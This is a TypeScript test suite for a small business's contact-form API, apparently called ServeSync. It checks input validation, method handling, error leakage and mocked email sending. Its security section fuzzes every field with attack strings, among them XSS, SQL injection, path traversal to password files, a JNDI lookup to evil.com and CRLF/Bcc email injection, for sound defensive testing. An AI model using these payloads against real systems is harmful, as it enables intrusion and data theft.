import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import request from "supertest";

const sendMock = vi.fn();

vi.mock("resend", () => {
  class MockResend {
    emails = { send: sendMock };
  }
  return { Resend: MockResend };
});

// Imported AFTER the mock is registered above, so contact.ts picks up the
// mocked Resend class instead of hitting the real API
const { app } = await import("./contact");

const ORIGINAL_ENV = { ...process.env };

beforeEach(() => {
  process.env.RESEND_API_KEY = "test_key";
  process.env.CONTACT_TO_EMAIL = "owner@servesync.test";
  process.env.CONTACT_FROM_EMAIL = "ServeSync <onboarding@resend.dev>";
  sendMock.mockReset();
  sendMock.mockResolvedValue({ data: { id: "test-id" }, error: null });
});

afterEach(() => {
  process.env = { ...ORIGINAL_ENV };
});

const validPayload = {
  name: "Jamie Rivera",
  email: "jamie@example.com",
  businessType: "Family restaurant",
  message: "Our weekly scheduling takes hours, can you help?",
};

function post(body: unknown, raw = false) {
  const req = request(app).post("/api/contact");
  if (raw) {
    return req.set("Content-Type", "application/json").send(body as string);
  }
  return req.send(body as object);
}

// 1 Baseline functional behaviour
describe("valid submissions", () => {
  it("accepts a fully valid submission", async () => {
    const res = await post(validPayload);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  it("accepts a submission without businessType (optional field)", async () => {
    const { businessType, ...rest } = validPayload;
    const res = await post(rest);
    expect(res.status).toBe(200);
  });

  it("never returns HTML — response is always valid JSON", async () => {
    const res = await post(validPayload);
    expect(() => JSON.parse(res.text)).not.toThrow();
  });

  it("response body always includes a boolean `success` key", async () => {
    const res = await post(validPayload);
    expect(typeof res.body.success).toBe("boolean");
  });
});

// 2 Missing / empty required fields — every combination
const requiredFields = ["name", "email", "message"] as const;

function omit(obj: Record<string, unknown>, key: string) {
  const copy = { ...obj };
  delete copy[key];
  return copy;
}

describe("missing required fields", () => {
  for (const field of requiredFields) {
    it(`rejects a submission missing "${field}"`, async () => {
      const res = await post(omit(validPayload, field));
      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
    });

    it(`rejects a submission where "${field}" is an empty string`, async () => {
      const res = await post({ ...validPayload, [field]: "" });
      expect(res.status).toBe(400);
    });

    it(`rejects a submission where "${field}" is whitespace only`, async () => {
      const res = await post({ ...validPayload, [field]: "   " });
      expect(res.status).toBe(400);
    });

    it(`rejects a submission where "${field}" is null`, async () => {
      const res = await post({ ...validPayload, [field]: null });
      expect(res.status).toBe(400);
    });

    it(`rejects a submission where "${field}" is a number`, async () => {
      const res = await post({ ...validPayload, [field]: 12345 });
      expect(res.status).toBe(400);
    });

    it(`rejects a submission where "${field}" is an array`, async () => {
      const res = await post({ ...validPayload, [field]: ["a", "b"] });
      expect(res.status).toBe(400);
    });

    it(`rejects a submission where "${field}" is an object`, async () => {
      const res = await post({ ...validPayload, [field]: { nested: true } });
      expect(res.status).toBe(400);
    });
  }

  it("rejects an entirely empty body", async () => {
    const res = await post({});
    expect(res.status).toBe(400);
  });

  it("rejects a body that is just an array", async () => {
    const res = await post([1, 2, 3] as unknown as object);
    expect(res.status).toBe(400);
  });
});

// 3. HTTP method enforcement
describe("HTTP method handling", () => {
  const wrongMethods: Array<"get" | "put" | "delete" | "patch" | "head"> = [
    "get",
    "put",
    "delete",
    "patch",
    "head",
  ];

  for (const method of wrongMethods) {
    it(`rejects ${method.toUpperCase()} requests with 405, not a crash`, async () => {
      const res = await (request(app) as any)[method]("/api/contact");
      expect(res.status).toBe(405);
    });
  }
});

// 4 Malformed request bodies
describe("malformed requests", () => {
  it("returns a clean JSON 400 for invalid JSON syntax (not an HTML error page)", async () => {
    const res = await post("{ this is not valid json", true);
    expect(res.status).toBe(400);
    expect(() => JSON.parse(res.text)).not.toThrow();
    expect(res.body.success).toBe(false);
  });

  it("rejects a request with no Content-Type header gracefully", async () => {
    const res = await request(app)
      .post("/api/contact")
      .unset("Content-Type")
      .send(JSON.stringify(validPayload));
    expect([200, 400, 415]).toContain(res.status);
  });

  it("rejects an oversized payload (>10kb) without crashing", async () => {
    const res = await post({ ...validPayload, message: "A".repeat(20000) });
    expect([400, 413]).toContain(res.status);
  });
});

// 5 Security payloads — the real point of this suite
// Each payload is tried against every user-controlled field. The bar for
// passing isn't "the app is aware of every attack" — it's that nothing
// here ever produces a 500 (a crash) or leaks a stack trace, and clearly
// bad input never gets treated as valid data
const maliciousPayloads = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "javascript:alert(document.cookie)",
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  "1; DROP TABLE contacts",
  "admin'--",
  "../../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "{{7*7}}",
  "${7*7}",
  "${jndi:ldap://evil.com/a}",
  "__proto__",
  "constructor.prototype.polluted",
  '{"$ne": null}',
  "%00",
  "\u0000",
  "\r\nSet-Cookie: session=hijacked",
  "test@test.com\r\nBcc: attacker@evil.com",
  "A".repeat(5000),
  "😀".repeat(500),
  "NULL",
  "undefined",
  "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
  "\t\n\r\t\n\r",
];

const fieldsToFuzz = ["name", "email", "businessType", "message"] as const;

describe("security payloads across every field", () => {
  for (const field of fieldsToFuzz) {
    for (const payload of maliciousPayloads) {
      it(`"${field}" with payload ${JSON.stringify(payload).slice(0, 40)} never crashes the server`, async () => {
        const res = await post({ ...validPayload, [field]: payload });
        expect(res.status).not.toBe(500);
        expect(res.body).toHaveProperty("success");
      });
    }
  }
});

// 6 No internal details ever leak to the client
describe("no information leakage", () => {
  it("error responses never contain a stack trace", async () => {
    const res = await post("{ broken json", true);
    expect(res.text).not.toMatch(/at Object\.|at Module\.|node_modules/);
  });

  it("error responses never contain a raw file path", async () => {
    const res = await post("{ broken json", true);
    expect(res.text).not.toMatch(/\/(home|Users|vercel)\//);
  });
});

// 7 Basic concurrency sanity check
describe("concurrency", () => {
  it("handles 20 simultaneous valid submissions without error", async () => {
    const requests = Array.from({ length: 20 }, () => post(validPayload));
    const results = await Promise.all(requests);
    for (const res of results) {
      expect(res.status).toBe(200);
    }
  });
});
--
// 8 Email delivery via Resend
describe("email delivery", () => {
  it("sends an email with the right recipient, sender, and reply-to", async () => {
    const res = await post(validPayload);
    expect(res.status).toBe(200);
    expect(sendMock).toHaveBeenCalledTimes(1);

    const callArgs = sendMock.mock.calls[0][0];
    expect(callArgs.to).toBe("owner@servesync.test");
    expect(callArgs.from).toBe("ServeSync <onboarding@resend.dev>");
    expect(callArgs.replyTo).toBe(validPayload.email);
    expect(callArgs.subject).toContain(validPayload.name);
  });

  it("includes the submitted message text in the email body", async () => {
    await post(validPayload);
    const callArgs = sendMock.mock.calls[0][0];
    expect(callArgs.text).toContain(validPayload.message);
  });

  it('uses "Not provided" when businessType is omitted', async () => {
    const { businessType, ...rest } = validPayload;
    await post(rest);
    const callArgs = sendMock.mock.calls[0][0];
    expect(callArgs.text).toContain("Not provided");
  });

  it("returns 500 with a clear message when RESEND_API_KEY is missing", async () => {
    delete process.env.RESEND_API_KEY;
    const res = await post(validPayload);
    expect(res.status).toBe(500);
    expect(res.body.success).toBe(false);
    expect(sendMock).not.toHaveBeenCalled();
  });

  it("returns 500 with a clear message when CONTACT_TO_EMAIL is missing", async () => {
    delete process.env.CONTACT_TO_EMAIL;
    const res = await post(validPayload);
    expect(res.status).toBe(500);
    expect(sendMock).not.toHaveBeenCalled();
  });

  it("returns 502 (not 500, not a leaked stack trace) when Resend returns an error object", async () => {
    sendMock.mockResolvedValueOnce({
      data: null,
      error: { message: "Resend rejected the request" },
    });
    const res = await post(validPayload);
    expect(res.status).toBe(502);
    expect(res.body.success).toBe(false);
    expect(res.text).not.toMatch(/at Object\.|node_modules/);
  });

  it("returns 502 when the Resend call throws (e.g. network failure)", async () => {
    sendMock.mockRejectedValueOnce(new Error("network unreachable"));
    const res = await post(validPayload);
    expect(res.status).toBe(502);
    expect(res.body.success).toBe(false);
  });

  it("does not attempt to send an email when required fields are missing", async () => {
    await post({ name: "Jamie" });
    expect(sendMock).not.toHaveBeenCalled();
  });
});